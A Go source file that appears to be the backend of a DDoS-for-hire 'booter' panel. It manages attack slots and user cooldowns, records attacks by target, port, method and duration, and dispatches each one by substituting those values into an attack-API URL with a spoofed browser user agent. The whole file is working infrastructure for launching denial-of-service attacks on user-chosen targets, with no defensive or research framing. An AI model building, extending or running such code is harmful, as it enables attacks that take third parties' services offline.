package main

import (
	"crypto/rand"
	"crypto/sha512"
	"encoding/hex"
	"fmt"
	"github.com/valyala/fasthttp"
	"log"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var UsersOnCooldown = sync.Map{}
var OngoingAttacks = sync.Map{}

var AttackSlots int64

var httpClient = fasthttp.Client{
	Name:                          "chrome browser wannabe",
	MaxIdleConnDuration:           10 * time.Second,
	MaxConnDuration:               10 * time.Second,
	MaxConnWaitTimeout:            10 * time.Second,
}

type Attack struct {
	Identifier 	string
	Attacker 	string
	Target 		string
	Duration 	int64
	Port   		int64
	Method 		string
	StartedAt 	int64
}

func GetAttackSlots() int64 {
	return atomic.LoadInt64(&AttackSlots)
}

func IncrementAttackSlots() {
	current := GetAttackSlots()
	atomic.StoreInt64(&AttackSlots, current + 1)
}

func DecrementAttackSlots() {
	current := GetAttackSlots()
	atomic.StoreInt64(&AttackSlots, current - 1)
}

func AreAttackSlotsFree() bool {
	return GetAttackSlots() < Settings.Attack.MaxSlots
}

func PutUserOnCooldown(username string, duration int64) {
	UsersOnCooldown.Store(username, time.Now().Add(time.Duration(duration) * time.Second).Unix())
}

func IsUserOnCooldown(username string) string {
	value, ok := UsersOnCooldown.Load(username)

	if !ok {
		return ""
	}

	timeLeft := value.(int64) - time.Now().Unix()

	if timeLeft > 1 {
		return fmt.Sprintf("You are on cooldown for %d more seconds.",
			value.(int64) - time.Now().Unix())
	}

	UsersOnCooldown.Delete(username)
	return ""
}

func (a *Attack) Store() {
	randBytes := make([]byte, 64)
	_, _ = rand.Read(randBytes)

	hasher := sha512.New()
	hasher.Write(randBytes)
	identifier := hex.EncodeToString(hasher.Sum(nil))[:6]
	a.Identifier = identifier

	OngoingAttacks.Store(identifier, a)
	IncrementAttackSlots()

	go func() {
		LogAttack(*a)
		fmt.Printf("Sleeping for %d seconds\n", a.Duration)
		time.Sleep(time.Duration(a.Duration) * time.Second)
		OngoingAttacks.Delete(identifier)
		DecrementAttackSlots()
	}()
}

func (a *Attack) Send() string {


	request := fasthttp.AcquireRequest()
	request.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36")
	request.Header.SetMethod(Settings.Attack.HttpMethod)
	request.SetRequestURI(a.GetURI())

	response := fasthttp.AcquireResponse()

	err := httpClient.Do(request, response)
	if err != nil {
		log.Printf("[ERROR] Could not send HTTP request to API. Error: %s\n", err.Error())
		return "Something went wrong sending the attack. Contact and admin or check the console"
	}

	fasthttp.ReleaseRequest(request)
	fasthttp.ReleaseResponse(response)

	return ""
}

func (a *Attack) GetURI() string {
	uri := Settings.Attack.ApiLink
	uri = strings.Replace(uri, "<target>", a.Target, -1)
	uri = strings.Replace(uri, "<port>", strconv.FormatInt(a.Port, 10), -1)
	uri = strings.Replace(uri, "<method>", a.Method, -1)
	uri = strings.Replace(uri, "<time>", strconv.FormatInt(a.Duration, 10), -1)

	return uri
}

